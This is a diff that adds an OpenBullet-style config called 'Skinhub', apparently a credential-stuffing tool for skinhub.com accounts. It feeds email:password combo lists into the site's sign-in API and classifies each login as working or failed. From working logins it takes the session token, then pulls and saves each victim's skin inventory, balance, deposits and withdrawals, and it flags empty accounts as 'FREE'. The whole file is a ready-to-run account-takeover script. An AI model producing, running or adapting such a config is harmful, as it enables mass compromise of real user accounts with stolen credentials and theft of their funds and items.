@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "Skinhub",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-24T15:41:23.5100414+01:00",
+  "AdditionalInfo": "Captures Skin Inventory, Balance, Deposits and Withdraws.",
+  "Author": "ND03",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.skinhub.com/api/users/sign_in" 
+  CONTENT "user%5Bpassword%5D=<PASS>&user%5Bemail%5D=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/javascript" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"errors\":{\"error\":[\"Wrong authentication information\"]}}" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#email PARSE "<SOURCE>" JSON "email" -> VAR "email" 
+
+#uid PARSE "<SOURCE>" JSON "user_id" -> VAR "uid" 
+
+#Skins REQUEST GET "https://api.skinhub.com/api/case_opens?page=1&type=winnings" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Authorization: Token token=\"<token>\", email=\"<email>\"" 
+  HEADER "GA_CID: null" 
+  HEADER "Origin: https://skinhub.com" 
+  HEADER "DNT: 1" 
+  HEADER "Cache-Control: max-age=0" 
+
+#Skin PARSE "<SOURCE>" JSON "name" Recursive=TRUE CreateEmpty=FALSE -> CAP "Skin" 
+
+#Price PARSE "<SOURCE>" JSON "case_items[*].price" JTokenParsing=TRUE Recursive=TRUE CreateEmpty=FALSE -> CAP "Price" "$" "" 
+
+#Profile REQUEST GET "https://api.skinhub.com/api/users/<uid>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Authorization: Token token=\"<token>\", email=\"<email>\"" 
+  HEADER "GA_CID: null" 
+  HEADER "Origin: https://skinhub.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://skinhub.com/" 
+  HEADER "Cache-Control: max-age=0" 
+
+#Balance PARSE "<SOURCE>" JSON "balance" CreateEmpty=FALSE -> CAP "Balance" "$" "" 
+
+#Deposits PARSE "<SOURCE>" JSON "total_deposits" CreateEmpty=FALSE -> CAP "Deposits" "$" "" 
+
+#Withdraws PARSE "<SOURCE>" JSON "total_withdrawals" CreateEmpty=FALSE -> CAP "Withdraws" "$" "" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Skin>" DoesNotExist 
+    KEY "<Balance>" EqualTo "$0.0" 
+    KEY "<Deposits>" EqualTo "$0.0" 
+    KEY "<Withdraws>" EqualTo "$0.0" 
+
